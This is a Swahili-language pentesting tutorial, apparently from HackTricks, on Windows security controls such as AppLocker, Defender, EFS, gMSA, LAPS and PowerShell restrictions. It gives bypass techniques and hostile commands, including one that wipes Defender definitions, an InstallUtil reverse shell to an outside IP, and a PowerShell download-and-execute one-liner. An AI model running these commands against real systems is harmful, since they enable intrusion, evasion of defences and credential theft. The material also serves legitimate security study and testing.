# Udhibiti wa Usalama wa Windows

{{#include ../banners/hacktricks-training.md}}

## Sera ya AppLocker

Application whitelist ni orodha ya programu au executable zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na software ambazo hazijaidhinishwa na haziendani na mahitaji mahususi ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **application whitelisting solution** ya Microsoft na huwapa system administrators udhibiti wa **programu na faili ambazo users wanaweza kuendesha**. Hutoa **udhibiti wa kina** wa executable, scripts, Windows installer files, DLLs, packaged apps na packed app installers.\
Ni jambo la kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** pamoja na write access kwenye directories fulani, **lakini yote haya yanaweza kubypassiwa**.

### Angalia

Angalia faili/extensions ambazo zimewekwa kwenye blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya registry ina mipangilio na sera zinazotumiwa na AppLocker, na hivyo kutoa njia ya kukagua seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** muhimu za kubypass AppLocker Policy: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **writable folders** unazoweza kutumia ili **bypass hii**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binaries za [**"LOLBAS's"**](https://lolbas-project.github.io/) ambazo kwa kawaida **huaminika** zinaweza pia kutumika kubypass AppLocker.
- **Rules zilizoandikwa vibaya pia zinaweza kubypass**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder inayoitwa `allowed`** mahali popote na itaruhusiwa.
- Organizations pia mara nyingi hulenga **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **maeneo mengine ya [**PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)** kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **Utekelezaji wa DLL huwa hauwezeshwi mara chache sana** kutokana na mzigo wa ziada unaoweza kuweka kwenye mfumo, pamoja na kiasi cha testing kinachohitajika kuhakikisha hakuna kitu kitaharibika. Kwa hiyo, kutumia **DLLs kama backdoors kutasaidia kubypass AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza** code ya **Powershell** katika process yoyote na kubypass AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Credentials za local zipo katika file hili, na passwords zime-hash.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizo-hash) **huhifadhiwa** kwenye **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya local (password policy, permissions za users...), **authentication**, **access tokens**...\
LSA ndiyo **itakayokagua** credentials zilizotolewa ndani ya file la **SAM** (kwa local login) na **kuwasiliana** na **domain controller** ili ku-authenticate domain user.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: Kerberos tickets, NT na LM hashes, na passwords zinazoweza kufichuliwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye disk:

- Password ya computer account ya Active Directory (domain controller isiyofikika).
- Passwords za accounts za Windows services
- Passwords za scheduled tasks
- Mengineyo (password ya IIS applications...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana tu katika Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, pamoja na versions za Windows Server. **Huzuia** pentesting tools za kawaida kama vile **`WinPEAS`**. Hata hivyo, kuna njia za **kubypass protections hizi**.

### Check

Ili kuangalia **status** ya **Defender** unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (angalia value ya **`RealTimeProtectionEnabled`** ili kujua kama iko active):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kui-enumerate unaweza pia ku-run:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS hulinda files kupitia encryption, kwa kutumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Key hii hu-encryptiwa kwa **public key** ya mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya $EFS ya file lililo-encryptiwa. Decryption inapohitajika, **private key** inayolingana ya digital certificate ya mtumiaji hutumika ku-decrypt FEK kutoka kwenye stream ya $EFS. Maelezo zaidi yanapatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios bila user initiation** zinajumuisha:

- Files au folders zinapohamishwa kwenda kwenye file system isiyo ya EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), hu-decryptiwa automatically.
- Encrypted files zinazotumwa kupitia network kwa kutumia SMB/CIFS protocol hu-decryptiwa kabla ya transmission.

Njia hii ya encryption inaruhusu **transparent access** ya encrypted files kwa owner. Hata hivyo, kubadilisha tu password ya owner na ku-login hakutaruhusu decryption.

**Key Takeaways**:

- EFS hutumia symmetric FEK, ambayo hu-encryptiwa kwa public key ya mtumiaji.
- Decryption hutumia private key ya mtumiaji kufikia FEK.
- Automatic decryption hutokea chini ya hali maalum, kama kunakili kwenda FAT32 au network transmission.
- Encrypted files zinapatikana kwa owner bila hatua za ziada.

### Kagua taarifa za EFS

Kagua kama **user** **ametumia** **service** hii kwa kuangalia kama path hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kagua **nani** ana **access** ya file kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folder ili **encrypt** na **decrypt** files zote

### Ku-decrypt EFS files

#### Being Authority System

Njia hii inahitaji **victim user** awe **akiendesha** **process** kwenye host. Ikiwa ni hivyo, kutoka kwenye `meterpreter` session unaweza ku-impersonate process token ya user (`impersonate_token` kutoka `incognito`). Vinginevyo, unaweza kufanya `migrate` kwenda kwenye process ya user.

#### Kujua Password ya User

Mimikatz inaweza ku-import certificate na private key ya user, kisha kuzitumia ku-decrypt files zilizolindwa na EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa service accounts katika IT infrastructures. Tofauti na traditional service accounts ambazo mara nyingi huwa na setting ya "**Password never expire**" ikiwa enabled, gMSAs hutoa suluhisho lenye usalama na usimamizi bora zaidi:

- **Automatic Password Management**: gMSAs hutumia password changamano yenye herufi 240, ambayo hubadilika automatically kulingana na domain au computer policy. Mchakato huu unasimamiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la password updates za manual.
- **Enhanced Security**: Accounts hizi haziathiriwi na lockouts na haziwezi kutumiwa kwa interactive logins, hivyo kuimarisha usalama wao.
- **Multiple Host Support**: gMSAs zinaweza kushirikiwa kati ya hosts nyingi, hivyo zinafaa kwa services zinazoendeshwa kwenye servers nyingi.
- **Scheduled Task Capability**: Tofauti na managed service accounts, gMSAs zinaunga mkono kuendesha scheduled tasks.
- **Simplified SPN Management**: System hu-update Service Principal Name (SPN) automatically kunapokuwa na mabadiliko kwenye sAMaccount details au DNS name ya computer, hivyo kurahisisha SPN management.

Passwords za gMSAs huhifadhiwa kwenye LDAP property _**msDS-ManagedPassword**_ na hu-resetiwa automatically kila baada ya siku 30 na Domain Controllers (DCs). Password hii, ambayo ni encrypted data blob inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza kupatikana tu na authorized administrators na servers ambazo gMSAs zimesakinishwa, hivyo kuhakikisha mazingira salama. Ili kufikia taarifa hii, secured connection kama LDAPS inahitajika, au connection lazima iwe authenticated kwa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Unaweza kusoma password hii kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Pia, angalia [ukurasa huu wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kutekeleza **NTLM relay attack** ili **kusoma** **password** ya **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

**Local Administrator Password Solution (LAPS)**, inayopatikana kwa kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), huwezesha usimamizi wa password za Administrator wa ndani. Password hizi, ambazo ni **randomized**, za kipekee, na **hubadilishwa mara kwa mara**, huhifadhiwa katikati katika Active Directory. Ufikiaji wa password hizi huzuiwa kupitia ACLs kwa watumiaji walioidhinishwa. Kwa ruhusa za kutosha zilizotolewa, uwezo wa kusoma password za local admin hutolewa.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **hufunga vipengele vingi vinavyohitajika** ili kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu .NET types zilizoidhinishwa, workflows zinazotegemea XAML, PowerShell classes, na zaidi.

### **Angalia**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Katika Windows za sasa, Bypass hiyo haitafanya kazi, lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kucompile unaweza kuhitaji** **ku** _**Ongeza Rejeleo**_ -> _Vinjari_ ->_Vinjari_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **ubadilishe project iwe .Net4.5**.

#### Bypass ya moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) **kutekeleza** code ya **Powershell** katika process yoyote na kubypass constrained mode. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Kwa default imewekwa kuwa **restricted.** Njia kuu za kubypass policy hii:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Zaidi yanaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumiwa kuthibitisha watumiaji.

SSPI itawajibika kutafuta protocol inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendelewa kwa hili ni Kerberos. Kisha SSPI itajadili ni authentication protocol ipi itakayotumika; authentication protocols hizi zinaitwa Security Support Provider (SSP), zinapatikana ndani ya kila mashine ya Windows katika mfumo wa DLL, na mashine zote mbili lazima ziunge mkono SSP hiyo hiyo ili ziweze kuwasiliana.

### SSP Kuu

- **Kerberos**: Inayopendelewa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za uoanifu
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers na LDAP, password katika mfumo wa MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumika kujadili protocol itakayotumika (Kerberos au NTLM, huku Kerberos ikiwa ndiyo default)
- %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa mbinu kadhaa au moja tu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **consent prompt kwa shughuli zinazohitaji privileges zilizoinuliwa**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Kukwepa AppLocker na PowerShell constrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [jinsi ya kusimbua files za EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying kwa gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [Njia 15 za Kukwepa PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
